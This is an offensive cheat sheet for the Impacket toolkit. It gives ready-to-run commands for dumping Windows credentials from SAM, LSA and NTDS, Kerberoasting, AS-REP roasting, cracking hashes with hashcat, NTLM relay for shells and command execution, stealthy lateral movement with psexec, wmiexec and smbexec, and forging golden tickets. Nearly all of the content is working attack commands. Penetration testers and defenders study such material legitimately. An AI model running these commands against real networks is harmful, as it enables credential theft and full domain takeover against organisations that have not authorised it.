# Impacket Suite

Collection of Python scripts for network protocol interaction and AD attacks.

**Install/Update:**
```sh
pip3 install impacket
# Or use ~/.local/bin/ path if installed via pipx
```

---

## secretsdump.py

Dump credentials remotely — SAM, LSA, NTDS.

```sh
# Dump SAM from workstation (needs local admin)
secretsdump.py DOMAIN/user:'Password'@<ip>

# NTDS dump — DC only (all domain hashes)
secretsdump.py DOMAIN/user:'Password'@<DC-IP> -just-dc-ntlm

# Using hash instead of password
secretsdump.py DOMAIN/user@<ip> -hashes :<NTLM-hash>

# DCC2 hashes need this mode in hashcat
hashcat -m 21000 dcc2.hashes /usr/share/wordlists/rockyou.txt --force
```

Output field order: `username:RID:LM-hash:NT-hash:::`
Take the **NT hash** (4th field) for cracking with `-m 1000`.

---

## GetUserSPNs.py (Kerberoasting)

```sh
# List SPNs and request TGS hashes
GetUserSPNs.py DOMAIN.local/user:Password -dc-ip <DC-IP> -request

# Save output to file
GetUserSPNs.py DOMAIN.local/user:Password -dc-ip <DC-IP> -request -outputfile tgs.txt

# Crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

---

## GetNPUsers.py (AS-REP Roasting)

Targets users with "Do not require Kerberos preauthentication":

```sh
# With user list
GetNPUsers.py DOMAIN.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat

# Authenticated (finds accounts automatically)
GetNPUsers.py DOMAIN.local/user:Password -dc-ip <DC-IP> -request -format hashcat

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## ntlmrelayx.py (SMB Relay)

```sh
# Relay and dump SAM
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive shell
ntlmrelayx.py -tf targets.txt -smb2support -i

# Execute command
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# LDAPS relay (for mitm6 attack)
ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh fake.domain.local -l lootme
```

---

## psexec.py / wmiexec.py / smbexec.py

```sh
# psexec — drops service binary (noisy but reliable)
psexec.py DOMAIN/user:'Password'@<ip>
psexec.py DOMAIN/user@<ip> -hashes :<NTLM-hash>

# wmiexec — uses WMI, doesn't drop files (stealthier)
wmiexec.py DOMAIN/user:'Password'@<ip>
wmiexec.py DOMAIN/user@<ip> -hashes :<NTLM-hash>

# smbexec — uses SMB shares (very stealthy)
smbexec.py DOMAIN/user:'Password'@<ip>
```

---

## ldapdomaindump.py

```sh
python3 -m ldapdomaindump ldaps://<DC-IP> -u 'DOMAIN\user' -p 'Password'
```

---

## ticketer.py (Golden/Silver Ticket)

```sh
# Golden Ticket
ticketer.py -nthash <krbtgt-hash> -domain-sid <SID> -domain domain.local FakeAdmin

# Export ticket
export KRB5CCNAME=FakeAdmin.ccache

# Use with tools
secretsdump.py -k -no-pass dc01.domain.local
```
